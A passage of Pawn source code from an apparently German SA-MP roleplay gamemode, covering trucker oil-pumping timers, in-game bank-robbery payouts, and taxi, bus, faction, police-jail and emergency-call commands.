    if(GetVehicleModel(veh) == 514 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 403 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 515 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    if(IsTrailerAttachedToVehicle(veh))
	    {
			new Float:prozent;
			new litre;
			if(TruckSpritmodus[playerid] == 23)
			{
			    PlayerTextDrawShow(playerid,Ladebalken[playerid][0]);
			    PlayerTextDrawShow(playerid,Ladebalken[playerid][1]);
			    PlayerTextDrawShow(playerid,Ladebalken[playerid][2]);
			    TruckSpritmodus[playerid] = 24;
			    prozent = 267.0;
			    litre = 12;
			}
			else if(TruckSpritmodus[playerid] == 24)
			{
		  		TruckSpritmodus[playerid] = 25;
		  		prozent = 275.0;
		  		litre = 20;

			}
			else if(TruckSpritmodus[playerid] == 25)
			{
			    TruckSpritmodus[playerid] = 26;
			    prozent = 290.0;
			    litre = 27;

			}
			else if(TruckSpritmodus[playerid] == 26)
			{
			    TruckSpritmodus[playerid] = 27;
			    prozent = 300.0;
			    litre = 39;
			}
			else if(TruckSpritmodus[playerid] == 27)
			{
			    TruckSpritmodus[playerid] = 28;
			    prozent = 310.0;
			    litre = 50;
			}
			else if(TruckSpritmodus[playerid] == 28)
			{
			    TruckSpritmodus[playerid] = 29;
			    prozent = 320.0;
			    litre = 65;
			}
			else if(TruckSpritmodus[playerid] == 29)
			{
			    TruckSpritmodus[playerid] = 30;
			    prozent = 330.0;
			    litre = 78;
			}
			else if(TruckSpritmodus[playerid] == 30)
			{
			    TruckSpritmodus[playerid] = 31;
			    prozent = 340.0;
			    litre = 85;
			}
			else if(TruckSpritmodus[playerid] == 31)
			{
		     	SendClientMessage(playerid,COLOR_GREEN,"Brennstoffe sind im Tank! Fahre zum Ölwart für die Auslieferung!");
		    	TogglePlayerControllable(playerid,true);
		    	SetPlayerCheckpoint(playerid,2685.4409,-8809.6064,4.0007-1,5.0);
			    TogglePlayerControllable(playerid, true);
			    TruckSpritmodus[playerid] = 32;
			    KillTimer(Abpumpen[playerid]);
			    prozent = 365.5;
			    litre = 100;
			    SetTimerEx("abschalten",2000,0,"%d",playerid);
			}
			new stringexp[12];
			format(stringexp,sizeof(stringexp),"%dL", litre);
		 	PlayerTextDrawSetString(playerid, Ladebalken[playerid][2], stringexp);
			PlayerTextDrawTextSize(playerid,Ladebalken[playerid][1], prozent, 80.000000);
			PlayerTextDrawHide(playerid,Ladebalken[playerid][1]);
			PlayerTextDrawShow(playerid,Ladebalken[playerid][1]);
    	}
		else
		{
			SendClientMessage(playerid,COLOR_RED,"JOB BEENDET: Du hattest keinen Anhänger!");
            vehicleprodukte[playervehiclemerk[playerid]] = 0;
			playervehiclemerk[playerid] = -1;
		    PlayerTrucker[playerid] = 0;
		    PlayerTruckmodus[playerid] = 0;
		    PlayerProdukt[playerid] = 0;
		    TruckSpritmodus[playerid] = 0;
		    DisablePlayerCheckpoint(playerid);
		    KillTimer(Abpumpen[playerid]);
		    TogglePlayerControllable(playerid,true);
		}
	}
	else
	{
		SendClientMessage(playerid,COLOR_RED,"JOB BEENDET: Du sitzt in keinem LKW!");
        vehicleprodukte[playervehiclemerk[playerid]] = 0;
		playervehiclemerk[playerid] = -1;
	    PlayerTrucker[playerid] = 0;
	    PlayerTruckmodus[playerid] = 0;
	    PlayerProdukt[playerid] = 0;
	    TruckSpritmodus[playerid] = 0;
	    DisablePlayerCheckpoint(playerid);
	    KillTimer(Abpumpen[playerid]);
	    TogglePlayerControllable(playerid,true);
	}
}
forward Turzuruck(id);
public Turzuruck(id)
{
	if(HausInfo[id][hTorOpen] == 2)
	{
    	HausInfo[id][hTorOpen] = 1;
	}
	else
	{
	    HausInfo[id][hTorOpen] = 0;
	}
	return 1;
}
forward Abpumpentimerzwei(playerid);
public Abpumpentimerzwei(playerid)
{
	new veh = GetPlayerVehicleID(playerid);
    if(GetVehicleModel(veh) == 514 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 403 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER || GetVehicleModel(veh) == 515 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
	    if(IsTrailerAttachedToVehicle(veh))
	    {
			new Float:prozent;
			new litre;
			if(TruckSpritmodus[playerid] == 13)
			{
			    PlayerTextDrawShow(playerid,Ladebalken[playerid][0]);
			    PlayerTextDrawShow(playerid,Ladebalken[playerid][1]);
			    PlayerTextDrawShow(playerid,Ladebalken[playerid][2]);
			    TruckSpritmodus[playerid] = 14;
			    prozent = 365.5;
			    litre = 100;
			}
			else if(TruckSpritmodus[playerid] == 14)
			{
		  		TruckSpritmodus[playerid] = 15;
		  		prozent = 350.0;
		  		litre = 87;

			}
			else if(TruckSpritmodus[playerid] == 15)
			{
			    TruckSpritmodus[playerid] = 16;
			    prozent = 337.0;
			    litre = 72;

			}
			else if(TruckSpritmodus[playerid] == 16)
			{
			    TruckSpritmodus[playerid] = 17;
			    prozent = 317.0;
			    litre = 60;
			}
			else if(TruckSpritmodus[playerid] == 17)
			{
			    TruckSpritmodus[playerid] = 18;
			    prozent = 307.0;
			    litre = 51;
			}
			else if(TruckSpritmodus[playerid] == 18)
			{
			    TruckSpritmodus[playerid] = 19;
			    prozent = 297.0;
			    litre = 42;
			}
			else if(TruckSpritmodus[playerid] == 19)
			{
			    TruckSpritmodus[playerid] = 20;
			    prozent = 287.0;
			    litre = 34;
			}
			else if(TruckSpritmodus[playerid] == 20)
			{
			    TruckSpritmodus[playerid] = 21;
			    prozent = 277.0;
			    litre = 18;
			}
			else if(TruckSpritmodus[playerid] == 21)
			{
		    	TogglePlayerControllable(playerid,true);
		    	SetPlayerCheckpoint(playerid,3109.1072,-8586.7773,3.9602-1,5.0);
			    SendClientMessage(playerid,COLOR_GREEN,"Dein Lastwagen wurde leer gepumpt. Hole nun den verarbeiteten Sprit ab.");
			    TogglePlayerControllable(playerid, true);
			    TruckSpritmodus[playerid] = 22;
			    KillTimer(Abpumpen[playerid]);
			    prozent = 267.0;
			    litre = 0;
			    SetTimerEx("abschalten",2000,0,"%d",playerid);
			}
			new stringexp[12];
			format(stringexp,sizeof(stringexp),"%dL", litre);
		 	PlayerTextDrawSetString(playerid, Ladebalken[playerid][2], stringexp);
			PlayerTextDrawTextSize(playerid,Ladebalken[playerid][1], prozent, 80.000000);
			PlayerTextDrawHide(playerid,Ladebalken[playerid][1]);
			PlayerTextDrawShow(playerid,Ladebalken[playerid][1]);
		}
		else
		{
			SendClientMessage(playerid,COLOR_RED,"JOB BEENDET: Du hattest keinen Anhänger!");
            vehicleprodukte[playervehiclemerk[playerid]] = 0;
			playervehiclemerk[playerid] = -1;
		    PlayerTrucker[playerid] = 0;
		    PlayerTruckmodus[playerid] = 0;
		    PlayerProdukt[playerid] = 0;
		    TruckSpritmodus[playerid] = 0;
		    DisablePlayerCheckpoint(playerid);
		    KillTimer(Abpumpen[playerid]);
		    TogglePlayerControllable(playerid,true);
		}
	}
	else
	{
		SendClientMessage(playerid,COLOR_RED,"JOB BEENDET: Du sitzt in keinem LKW!");
        vehicleprodukte[playervehiclemerk[playerid]] = 0;
		playervehiclemerk[playerid] = -1;
	    PlayerTrucker[playerid] = 0;
	    PlayerTruckmodus[playerid] = 0;
	    PlayerProdukt[playerid] = 0;
	    TruckSpritmodus[playerid] = 0;
	    DisablePlayerCheckpoint(playerid);
	    KillTimer(Abpumpen[playerid]);
	    TogglePlayerControllable(playerid,true);
	}
}

forward Geldnichterhalten(playerid);
public Geldnichterhalten(playerid)
{
	if(Bankraubgeld[playerid] > 0 || Bankraubtextdraw[playerid] > 0)
	{
	    new string[265];
	    KillTimer(Moneytimer[playerid]);
	    format(string,sizeof(string),"Du bist gestorben! Du erhälst keine Beute!");
		SendClientMessage(playerid,COLOR_YELLOW,string);
		PlayerTextDrawHide(playerid,Bankklau[playerid][0]);
		PlayerTextDrawHide(playerid,Bankklau[playerid][1]);
		Bankraubgeld[playerid] = 0;
		Bankraubtextdraw[playerid] = 0;
	 	RemovePlayerAttachedObject(playerid, 3);
	}
	return 1;
}
forward Gelderhalten(playerid);
public Gelderhalten(playerid)
{
	new string[265];
	GebeGeld(playerid,Bankraubgeld[playerid]);
	format(string,sizeof(string),"Du hast durchgehalten! Du erhälst %.2f$ aus deinem Rucksack!",Bankraubgeld[playerid]);
	SendClientMessage(playerid,COLOR_YELLOW,string);
	PlayerTextDrawHide(playerid,Bankklau[playerid][0]);
	PlayerTextDrawHide(playerid,Bankklau[playerid][1]);
	Bankraubgeld[playerid] = 0;
	Bankraubtextdraw[playerid] = 0;
	RemovePlayerAttachedObject(playerid, 3);
}
forward Abpumpentimer(playerid);
public Abpumpentimer(playerid)
{
	new Float:prozent;
	new litre;
	if(TruckSpritmodus[playerid] == 3)
	{
	    PlayerTextDrawShow(playerid,Ladebalken[playerid][0]);
	    PlayerTextDrawShow(playerid,Ladebalken[playerid][1]);
	    PlayerTextDrawShow(playerid,Ladebalken[playerid][2]);
	    SendClientMessage(playerid,COLOR_GREEN,"Das Öl wird nun abgepumpt!");
	    TruckSpritmodus[playerid] = 4;
	    prozent = 267.0;
	    litre = 12;
	}
	else if(TruckSpritmodus[playerid] == 4)
	{
  		TruckSpritmodus[playerid] = 5;
  		prozent = 275.0;
  		litre = 20;

	}
	else if(TruckSpritmodus[playerid] == 5)
	{
	    TruckSpritmodus[playerid] = 6;
	    prozent = 290.0;
	    litre = 27;

	}
	else if(TruckSpritmodus[playerid] == 6)
	{
	    TruckSpritmodus[playerid] = 7;
	    prozent = 300.0;
	    litre = 39;
	}
	else if(TruckSpritmodus[playerid] == 7)
	{
	    TruckSpritmodus[playerid] = 8;
	    prozent = 310.0;
	    litre = 50;
	}
	else if(TruckSpritmodus[playerid] == 8)
	{
	    TruckSpritmodus[playerid] = 9;
	    prozent = 320.0;
	    litre = 65;
	}
	else if(TruckSpritmodus[playerid] == 9)
	{
	    TruckSpritmodus[playerid] = 10;
	    prozent = 330.0;
	    litre = 78;
	}
	else if(TruckSpritmodus[playerid] == 10)
	{
	    TruckSpritmodus[playerid] = 11;
	    prozent = 340.0;
	    litre = 85;
	}
	else if(TruckSpritmodus[playerid] == 11)
	{
	    SendClientMessage(playerid,COLOR_GREEN,"Dein Lastwagen ist vollgepumpt! Gebe das Öl zu verarbeitung ab!");
	    SetPlayerCheckpoint(playerid,3026.8870,-8609.4404,3.9644-1,5.0);
	    ClearAnimations(playerid);
	    TogglePlayerControllable(playerid, true);
	    TruckSpritmodus[playerid] = 12;
	    KillTimer(Abpumpen[playerid]);
	    prozent = 365.5;
	    litre = 100;
	    SetTimerEx("abschalten",2000,0,"%d",playerid);
	}
	new stringexp[12];
	format(stringexp,sizeof(stringexp),"%dL", litre);
 	PlayerTextDrawSetString(playerid, Ladebalken[playerid][2], stringexp);
	PlayerTextDrawTextSize(playerid,Ladebalken[playerid][1], prozent, 80.000000);
	PlayerTextDrawHide(playerid,Ladebalken[playerid][1]);
	PlayerTextDrawShow(playerid,Ladebalken[playerid][1]);
}
forward abschalten(playerid);
public abschalten(playerid)
{
	PlayerTextDrawHide(playerid,Ladebalken[playerid][0]);
 	PlayerTextDrawHide(playerid,Ladebalken[playerid][1]);
 	PlayerTextDrawHide(playerid,Ladebalken[playerid][2]);
}
forward SetAufzugBereit();
public SetAufzugBereit()
{
	AufzugBereit = 1;
	for(new x = 0; x < sizeof(EtagenText); x++)
	{
 		Update3DTextLabelText(EtagenText[x],0x00FF00FF,"Drücke '~k~~CONVERSATION_NO~' um den Aufzug zu rufen.");
	}
}
cmd:fahrpreis(playerid,params[])
{
    printf("%s fahrpreis",PlayerName(playerid));
	new string[50],Float:geld,str[100];
    if(SpielerInfo[playerid][uJob] != 2) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Taxifahrer!");
    if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 420 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 438) return SendClientMessage(playerid,COLOR_RED,"Du sitzt in keinem Taxi!");
	if(sscanf(params,"f",geld)) return SendClientMessage(playerid,COLOR_RED,"Benutze /fahrpreis [Fahrpreis]");
	if(geld < 0.01 || geld > 10) return SendClientMessage(playerid,COLOR_RED,"Der Fahrpreis muss mindestens 1 Cent und 10$ betragen!");
	Fahrpreis[playerid] = geld;
	format(string,sizeof string,"Fahrpreis auf %.2f$ geändert.",geld);
	SendClientMessage(playerid,COLOR_GREEN,string);
	format(str,sizeof(str),"{FEFEFE}Taxi\n{FF5A00}Fahrpreis: {FEFEFE}%.2f$",geld);
	if(taxilabel[GetPlayerVehicleID(playerid)] == 0){
		taxitext[GetPlayerVehicleID(playerid)] = Create3DTextLabel(str, -1, 0.0, 0.0, 0.0, 50.0, 0, 1 );
	    Attach3DTextLabelToVehicle(taxitext[GetPlayerVehicleID(playerid)] , GetPlayerVehicleID(playerid), 0.0, 0.0, 1.4);
	    taxilabel[GetPlayerVehicleID(playerid)] = 1;
	}
	else{
	    Delete3DTextLabel(taxitext[GetPlayerVehicleID(playerid)]);
	    taxitext[GetPlayerVehicleID(playerid)] = Text3D:INVALID_3DTEXT_ID;
	}
	return 1;
}
cmd:linien(playerid,params[])
{
    if(!IsPlayerInRangeOfPoint(playerid,50.0,1664.8098,-9288.5889,4.4999) && !IsPlayerInRangeOfPoint(playerid,50.0,6616.0835,-7800.7007,4.4096)) return SendClientMessage(playerid,COLOR_RED,"Du kannst deine Runde nur starten wenn Du dich am Busparkplatz befindest!");
    printf("%s linien",PlayerName(playerid));
    if(SpielerInfo[playerid][uJob] != 3) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Busfahrer!");
    if(GetVehicleModel(GetPlayerVehicleID(playerid)) != 437 && GetVehicleModel(GetPlayerVehicleID(playerid)) != 431) return SendClientMessage(playerid,COLOR_RED,"Du sitzt in keinem Bus!");
	if(Buslinie[playerid] == 0)
	{
	    Buslinie[playerid] = 1;
	    SetPlayerCheckpoint(playerid,Buslinien[0][0],Buslinien[0][1],Buslinien[0][2],3.0);
	    SendClientMessage(playerid,COLOR_GREEN,"Busfahrt gestartet!");
	}
	else SendClientMessage(playerid,COLOR_RED,"Du fährst bereits eine Buslinie ab!");
	return 1;
}
/*cmd:carsave(playerid,params[])//HUHU
{
	new File:file, string[128], Float:X, Float:Y,Float:Z,Float:RZ;
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,COLOR_RED,"Du sitzt in keinem Fahrzeug!");
	GetVehiclePos(GetPlayerVehicleID(playerid),X,Y,Z);
	GetVehicleZAngle(GetPlayerVehicleID(playerid),RZ);
	if(!fexist("cars.txt"))file = fopen("cars.txt", io_write);
	else file = fopen("cars.txt", io_append);
	format(string, sizeof string,"{%.2f,%.2f,%.2f,%.2f}\n",X,Y,Z,RZ);
	fwrite(file, string);
	fclose(file);
	return 1;
}*/
cmd:audiomessage(playerid,params[])
{
    printf("%s audiomessage",PlayerName(playerid));
	new str[200],text[200];
    if(SpielerInfo[playerid][uAdmin] < 4) return KeineRechte(playerid);
    if(sscanf(params,"s[200]", text)) return SendClientMessage(playerid,COLOR_RED,"Benutze /audiomessage [Text]");
	format(str,sizeof(str), "https://translate.google.com/translate_tts?tl=de&q=%s", text);
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i) && !IsPlayerNPC(i))
		{
 			PlayAudioStreamForPlayer(i, str);
		}
	}
	return 1;
}
cmd:fraktion(playerid,params[])
{
    printf("%s fraktion",PlayerName(playerid));
	if(SpielerInfo[playerid][uLeiter] == 0 && SpielerInfo[playerid][uMitglied] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Fraktion!");
	if(SpielerInfo[playerid][uLeiter] > 0) ShowPlayerDialog(playerid,DIALOG_FRAKMENU,DIALOG_STYLE_LIST,"Fraktionsmenü","Spieler\nFahrzeuge\nFraktionskasse\nHilfe\nLeader\nFraktionsränge","Weiter","Abbrechen");
	else
	{
	    new data[MAX_PLAYER_NAME],data2[2],stringges[1000],string[150];
		format(string,sizeof string,"SELECT login.Name,user.Rang FROM `user` JOIN `login` ON user.userid=login.ID WHERE user.Mitglied='%d' OR user.Leiter='%d'",SpielerInfo[playerid][uMitglied],SpielerInfo[playerid][uMitglied]);
  		mysql_query(dbhandle, string, true);
  		printf("%s",string);

		for(new i=0; i<cache_num_rows(); i++)
		{
			cache_get_field_content(i, "Name",data);
			cache_get_field_content(i, "Rang",data2);
   			format(stringges,sizeof stringges,"%s\n%s - Rang: %s",stringges,data,data2);
		}

  		ShowPlayerDialog(playerid,DIALOG_MSGBOX,DIALOG_STYLE_LIST,"Fraktionsliste",stringges,"OK","");
	}
	return 1;
}
cmd:zerren(playerid,params[])
{
    printf("%s zerren",PlayerName(playerid));
	new pID,string[265];
    if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
    if(SpielerInfo[playerid][uDienst] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Dienst!");
    if(sscanf(params,"r",pID)) return SendClientMessage(playerid,COLOR_RED,"Benutze /zerren [Name/ID]");
    if(!IsPlayerInAnyVehicle(playerid))return SendClientMessage(playerid,COLOR_RED,"Du bist in keinem Fahrzeug!");
    if(EntfernungZwischenSpielern(playerid,pID) > 7) return SendClientMessage(playerid,COLOR_RED,"Der Spieler befindet sich nicht in deiner Nähe!");
	if(GetPlayerSpecialAction(giveplayerid) != SPECIAL_ACTION_CUFFED)return SendClientMessage(playerid,COLOR_RED,"Der Spieler trägt keine Handschellen!");
	format(string,sizeof string,"Du hast %s in dein Fahrzeug gezerrt!",PlayerName(giveplayerid));
	SendClientMessage(playerid,COLOR_GREEN,string);
	format(string,sizeof string,"Du wurdest von %s in sein Fahrzeug gezerrt!",PlayerName(playerid));
	SendClientMessage(giveplayerid,COLOR_GREEN,string);
	PutPlayerInVehicle(giveplayerid,GetPlayerVehicleID(playerid),2);
	Freeze(giveplayerid);
	return 1;
}
cmd:ziehen(playerid,params[])
{
    printf("%s ziehen",PlayerName(playerid));
	new pID;
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
	if(sscanf(params,"r",pID)) return SendClientMessage(playerid,COLOR_RED,"Benutze /ziehen [Name/ID]");
	//if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT || GetPlayerState(id) != PLAYER_STATE_ONFOOT) return SendClientMessage(playerid, -1, "Du oder der Spieler befindet sich im Auto.");
	if(machtbereits[playerid] == 0)
	{
		new Float:Angle;
		GetPlayerFacingAngle(playerid,Angle);
		SetPlayerFacingAngle(pID,Angle);
		ApplyAnimation(pID, "PED", "WALK_civi", 4.1, 1, 1, 1, 1, 1, 1);
		SetTimerEx("Folgen",700,1,"d",playerid);
		Merkenid[playerid] = pID;
		machtbereits[playerid] = 1;
	}
	else{
		machtbereits[playerid] = 0;
		ClearAnimations(playerid);
		SetPlayerSpecialAction(Merkenid[playerid],SPECIAL_ACTION_CUFFED);
		Merkenid[playerid] = -1;
	}
	return 1;
}
forward Folgen(playerid);
public Folgen(playerid)
{
	new Float:Angle;
	GetPlayerFacingAngle(playerid,Angle);
	SetPlayerFacingAngle(Merkenid[playerid],Angle);
	ApplyAnimation(Merkenid[playerid], "PED", "WALK_civi", 4.1, 1, 1, 1, 1, 1, 1);
	return 1;
}
cmd:alarmieren(playerid,params[])
{
    printf("%s alarmieren",PlayerName(playerid));
    if(!IstSpielerInFrak(playerid,4) && !IstSpielerInFrak(playerid,3)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Mitglieder des Fire Departments Lake Sorten!");
    ShowPlayerDialog(playerid,DIALOG_ALARMIERUNG,DIALOG_STYLE_LIST,"Alarmierung - Auswahl","Per Funkwecker\nDachsirne\nAktuelle Brände\nAktuelle Ölspuren","Ausführen","Abbrechen");
	return 1;
}
cmd:einsperren(playerid,params[])
{
    printf("%s einsperren",PlayerName(playerid));
    new Float:preis = 0.00,zeit,string[100];
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2) && !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
	if(SpielerInfo[playerid][uDienst] == 0) return SendClientMessage(playerid,COLOR_RED,"Du bist nicht im Dienst!");
	if(sscanf(params,"rdf",giveplayerid,zeit,preis)) return SendClientMessage(playerid,COLOR_RED,"Benutze einsperren [Name/ID] [Zeit in min] [Bußgeld]");
	if(EntfernungZwischenSpielern(playerid,giveplayerid) > 8) return SendClientMessage(playerid,COLOR_RED,"Der Spieler befindet sich nicht in deiner Nähe!");
	if(preis < 0.01) return SendClientMessage(playerid,COLOR_RED,"Das Bußgeld darf nicht weniger als 1 Cent betragen!");
	if(preis > 10000) return SendClientMessage(playerid,COLOR_RED,"Das Bußgeld darf nicht mehr als 10000 Cent betragen!");
	if(zeit < 1) return SendClientMessage(playerid,COLOR_RED,"Du kannst den Verbrecher nicht unter einer Minute einsperren!");
	if(GetPlayerSpecialAction(giveplayerid) == SPECIAL_ACTION_CUFFED)
	{
		if(SpielerInfo[giveplayerid][uWantedLevel] >= 1)
		{
			if(IsPlayerInRangeOfPoint(playerid,2,1557.1573,-9483.9014,7.1537) || IsPlayerInRangeOfPoint(playerid,2,1561.1548,-9479.8838,7.1537) || IsPlayerInRangeOfPoint(playerid,2,1564.6996,-9484.1416,7.1537))
			{
			    if(IsPlayerInRangeOfPoint(giveplayerid,4,1561.0149,-9479.2461,7.1537) || IsPlayerInRangeOfPoint(giveplayerid,4,1557.4990,-9479.9883,7.1537) || IsPlayerInRangeOfPoint(giveplayerid,4,1564.9070,-9479.7246,7.1537))
			    {
			    	GebeGeld(giveplayerid,-preis);
					if(SpielerInfo[playerid][uLeiter] > 0) {Fraktionskasse[SpielerInfo[playerid][uLeiter]]+=(preis-preis/10+0.0001); Frakkassespeichern(SpielerInfo[playerid][uLeiter]);}
					else {Fraktionskasse[SpielerInfo[playerid][uMitglied]]+=(preis-preis/10); Frakkassespeichern(SpielerInfo[playerid][uMitglied]);}
					GebeGeld(playerid,preis/10);
					SpielerInfo[giveplayerid][uWantedLevel] = 0;
					SpielerInfo[giveplayerid][uKnastZeit] = zeit*60;
					format(string,sizeof string,"Du hast %s %d Minuten für %.2f$ Bußgeld eingesperrt! Belohnung: %.2f$",PlayerName(giveplayerid),zeit,preis,preis/10);
					SendClientMessage(playerid,COLOR_GREEN,string);
					format(string,sizeof string,"Du wurdest von %s %d Minuten für %.2f$ Bußgeld eingesperrt!",PlayerName(playerid),zeit,preis);
					SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
					SetPlayerSpecialAction(giveplayerid,0);
					SpielerInfo[giveplayerid][uGefangen] = 1;
					format(string,sizeof string,"%s wurde von %s für %d Minuten und %.2f$ Bußgeld eingesperrt!",PlayerName(giveplayerid),PlayerName(playerid),zeit,preis);
					FraktionsNachricht(1,COLOR_HQ,string);
					FraktionsNachricht(2,COLOR_HQ,string);

				}
				else{SendClientMessage(playerid,COLOR_RED,"Der Gefangene ist in keiner Zelle!");}
			}
			else if(IsPlayerInRangeOfPoint(playerid,3,6495.51611, -7887.85840, 4.86880) || IsPlayerInRangeOfPoint(playerid,3,6495.51611, -7884.18896, 4.86880) || IsPlayerInRangeOfPoint(playerid,3,6495.51611, -7891.53516, 4.86880))
			{
   				if(IsPlayerInRangeOfPoint(giveplayerid,5,6490.4551,-7892.3726,4.6186) || IsPlayerInRangeOfPoint(giveplayerid,5,6490.8994,-7888.6934,4.6186) || IsPlayerInRangeOfPoint(giveplayerid,5,6491.2329,-7885.0195,4.6186))
			    {
			    	GebeGeld(giveplayerid,-preis);
					if(SpielerInfo[playerid][uLeiter] > 0) {Fraktionskasse[SpielerInfo[playerid][uLeiter]]+=(preis-preis/10+0.0001); Frakkassespeichern(SpielerInfo[playerid][uLeiter]);}
					else {Fraktionskasse[SpielerInfo[playerid][uMitglied]]+=(preis-preis/10+0.0001); Frakkassespeichern(SpielerInfo[playerid][uMitglied]);}
					GebeGeld(playerid,preis/10);
					SpielerInfo[giveplayerid][uWantedLevel] = 0;
					SpielerInfo[giveplayerid][uKnastZeit] = zeit*60;
					format(string,sizeof string,"Du hast %s %d Minuten für %.2f$ Bußgeld eingesperrt! Belohnung: %.2f$",PlayerName(giveplayerid),zeit,preis,preis/10);
					SendClientMessage(playerid,COLOR_GREEN,string);
					format(string,sizeof string,"Du wurdest von %s %d Minuten für %.2f$ Bußgeld eingesperrt!",PlayerName(playerid),zeit,preis);
					SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
					SetPlayerSpecialAction(giveplayerid,0);
					SpielerInfo[giveplayerid][uGefangen] = 2;
					format(string,sizeof string,"%s wurde von %s für %d Minuten und %.2f$ Bußgeld eingesperrt!",PlayerName(giveplayerid),PlayerName(playerid),zeit,preis);
					FraktionsNachricht(1,COLOR_HQ,string);
					FraktionsNachricht(2,COLOR_HQ,string);
					FraktionsNachricht(15,COLOR_HQ,string);

				}
				else{SendClientMessage(playerid,COLOR_RED,"Der Gefangene ist in keiner Zelle!");}
			}
			else if(IsPlayerInArea(playerid,4502.1255,-8692.7021,4520.2397,-8689.3770))
			{
   				if(IsPlayerInArea(giveplayerid,4502.1255,-8688.7764,4519.3950,-8683.8037))
			    {
			    	GebeGeld(giveplayerid,-preis);
					if(SpielerInfo[playerid][uLeiter] > 0) {Fraktionskasse[SpielerInfo[playerid][uLeiter]]+=(preis-preis/10+0.0001); Frakkassespeichern(SpielerInfo[playerid][uLeiter]);}
					else {Fraktionskasse[SpielerInfo[playerid][uMitglied]]+=(preis-preis/10+0.0001); Frakkassespeichern(SpielerInfo[playerid][uMitglied]);}
					GebeGeld(playerid,preis/10);
					SpielerInfo[giveplayerid][uWantedLevel] = 0;
					SpielerInfo[giveplayerid][uKnastZeit] = zeit*60;
					format(string,sizeof string,"Du hast %s %d Minuten für %.2f$ Bußgeld eingesperrt! Belohnung: %.2f$",PlayerName(giveplayerid),zeit,preis,preis/10);
					SendClientMessage(playerid,COLOR_GREEN,string);
					format(string,sizeof string,"Du wurdest von %s %d Minuten für %.2f$ Bußgeld eingesperrt!",PlayerName(playerid),zeit,preis);
					SendClientMessage(giveplayerid,COLOR_LIGHTBLUE,string);
					SetPlayerSpecialAction(giveplayerid,0);
					SpielerInfo[giveplayerid][uGefangen] = 3;
					format(string,sizeof string,"%s wurde von %s für %d Minuten und %.2f$ Bußgeld eingesperrt!",PlayerName(giveplayerid),PlayerName(playerid),zeit,preis);
					FraktionsNachricht(1,COLOR_HQ,string);
					FraktionsNachricht(2,COLOR_HQ,string);
					FraktionsNachricht(15,COLOR_HQ,string);

				}
				else{SendClientMessage(playerid,COLOR_RED,"Der Gefangene ist in keiner Zelle!");}
			}
			else{SendClientMessage(playerid,COLOR_RED,"Du befindest dich nicht bei den Zellen!");}
		}else{SendClientMessage(playerid,COLOR_RED,"Der Spieler hat keine Wanteds!");}
	}else{SendClientMessage(playerid,COLOR_RED,"Der Spieler hat keine Handschellen an");}
	return 1;
}
cmd:needhelp(playerid,params[])
{
    printf("%s needhelp",PlayerName(playerid));
    new string[128],Float:xx,Float:yy,Float:zz;
	if(!IstSpielerInFrak(playerid,1) && !IstSpielerInFrak(playerid,2)&& !IstSpielerInFrak(playerid,15)) return SendClientMessage(playerid,COLOR_RED,"Du bist kein Polizist/Army!");
	GetPlayerPos(playerid,xx,yy,zz);
	if(IstSpielerInFrak(playerid,1))
	{
		format(string,sizeof string,"HQ: [LSPD]: %s braucht dringend hilfe. Bitte gegeben sie sich zum Checkpoint!",PlayerName(playerid));
		FraktionsNachricht(1,COLOR_HQ,string);
		FraktionsNachricht(2,COLOR_HQ,string);
		FraktionsNachricht(15,COLOR_HQ,string);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
    		if(IstSpielerInFrak(i,1) && SpielerInfo[i][uDienst] == 1 ||IstSpielerInFrak(i,2) && SpielerInfo[i][uDienst] == 1 || IstSpielerInFrak(i,15) && SpielerInfo[i][uDienst] == 1)
    		{
				SetPlayerCheckpoint(i,xx,yy,zz-1,3);
				cpaktiv[i] = 1;
			}
		}

 	}
	else if(IstSpielerInFrak(playerid,2))
	{
		format(string,sizeof string,"HQ: [SFPD]: %s braucht dringend hilfe. Bitte gegeben sie sich zum Checkpoint!",PlayerName(playerid));
		FraktionsNachricht(1,COLOR_HQ,string);
		FraktionsNachricht(2,COLOR_HQ,string);
		FraktionsNachricht(15,COLOR_HQ,string);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
    		if(IstSpielerInFrak(i,1) && SpielerInfo[i][uDienst] == 1 ||IstSpielerInFrak(i,2)  && SpielerInfo[i][uDienst] == 1 || IstSpielerInFrak(i,15) && SpielerInfo[i][uDienst] == 1 )
    		{
				SetPlayerCheckpoint(i,xx,yy,zz-1,3);
				cpaktiv[i] = 1;
			}
		}
 	}
	else if(IstSpielerInFrak(playerid,15))
	{
		format(string,sizeof string,"HQ: [ARMY]: %s braucht dringend hilfe. Bitte gegeben sie sich zum Checkpoint!",PlayerName(playerid));
		FraktionsNachricht(1,COLOR_HQ,string);
		FraktionsNachricht(2,COLOR_HQ,string);
		FraktionsNachricht(15,COLOR_HQ,string);
		for(new i = 0; i < MAX_PLAYERS; i++)
		{
